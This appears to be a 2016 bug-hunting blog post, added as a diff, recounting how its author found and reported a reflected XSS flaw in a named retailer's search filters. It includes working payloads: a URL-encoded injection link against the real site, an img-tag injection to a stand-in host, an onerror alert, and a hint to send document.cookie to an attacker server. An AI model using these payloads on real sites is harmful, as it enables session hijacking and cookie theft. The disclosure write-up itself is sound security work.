@@ -1,0 +1,62 @@
+---
+title:  "(First) Reflected XSS"
+date:   2016-04-02 
+tags: [xss]
+---
+
+A few weeks ago, I took part in the [Cyber Security Challenge Belgium][CSCBE], an annual CTF hosted by [NVISO][NVISO] intended for Belgian students to test their security knowledge. After talking with some experienced security researchers, they convinced me to start bug hunting. They advised me to start seeking for vulnerabilities on small independent websites instead of hunting large programs on [HackerOne][HackerOne] and [Bugcrowd][Bugcrowd].
+
+After crawling over various websites, I noticed some strange behaviour on the website of [Brouwland][Brouwland]. Users are able to search for products by using the query input form. Since the resulting page includes the query string, I checked whether it was vulnerable to reflected XSS by entering some special characters. 
+
+The query `XSS">` returned the following page:
+
+[![]({{ site.url }}/images/posts/first-xss-1.png)]({{ site.url }}/images/posts/first-xss-1.png)
+
+Surprisingly, the double quote and closing tag were not being escaped. HTML escaping exists in transforming special characters allowing the browser to interpret them as text instead of HTML code, which makes XSS impossible. Input which does not gets escaped? This seemed to easy. If I just close the current tag using `</*>`, I could append my malicious script which will be executed by the browser. For example: 
+
+`test</p><script>alert('XSS')</script>`
+
+Unfortunately, the input starting from the closing tags gets omitted in the returning string. Only `test` was reflected in the returning string. This technique, also known as sanitizing, is another common way to prevent XSS. Thus, these fields are invulnerable to XSS.
+
+After analysing the source code for a second time, I found a more interesting place which reflected my query. The user can filter his search results using the buttons next to the search field. After querying, these buttons contain an href attribute which will execute a filtered search. For example, given input 'XSS':
+
+[![]({{ site.url }}/images/posts/first-xss-2.png)]({{ site.url }}/images/posts/first-xss-2.png)
+
+A quick test reveals the input is neither escaped nor sanitized. Bazinga! Let's just exit the current tag and inject our script using the following query:
+
+`XSS"><script>alert('XSS')</script>`
+
+However, this is detected by Google Chrome's XSS auditor. The auditor identifies malicious request parameters and blocks the response if it believes the code is injected in the response. 
+
+Time to craft another query:
+
+`XSS"></a></li><li><img src="http://www.maliciouslink.com"></li><li><a class="btn btn-default" href="`
+
+Yay, this is accepted! Using URL encoding, we could create the following link:
+
+<div style="overflow-x: auto; overflow-y: hidden; white-space: nowrap; font-style: italic;">www.brouwland.com%2Fen%2Fsearch%3Fq%3DXSS%22%20%3E%3C%2Fa%3E%3C%2Fli%3E%3Cli%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.maliciouslink.com%22%3E%3C%2Fli%3E%3Cli%3E%3Ca%20class%3D%22btn%20btn-default%22%20href%3D%22</div>
+
+<br>
+This results in the following source code:
+
+[![]({{ site.url }}/images/posts/first-xss-3.png)]({{ site.url }}/images/posts/first-xss-3.png)
+
+The page looked like this:
+
+[![]({{ site.url }}/images/posts/first-xss-4.png)]({{ site.url }}/images/posts/first-xss-4.png)
+
+Hence, clicking the link will result in a request to `www.maliciouslink.com`. Although this does not seem malicious, we could replace this link with `www.yourserver.com/cookie?+document.cookie` to send the cookie of an authenticated user to your server and hijack their session. Another possible exploit is to use the onerror attribute in the img tag to execute some arbitrary JavaScript code:
+
+`<img src=x onerror=alert('XSS') />`
+
+There are probably a dozen ways to exploit this vulnerability, however I reported it shortly after I found out the input did not get escaped or sanitized. Their team fixed the bug two days later and thanked me for my findings. Overall, it was a fun and easy first bug. Hopefully this is the start of many other bug discoveries!
+
+
+[CSCBE]: https://www.cybersecuritychallenge.be/
+[NVISO]: https://www.nviso.be/
+[HackerOne]: https://hackerone.com/
+[Bugcrowd]: https://bugcrowd.com
+[Brouwland]: https://www.brouwland.com/en
+
+
+
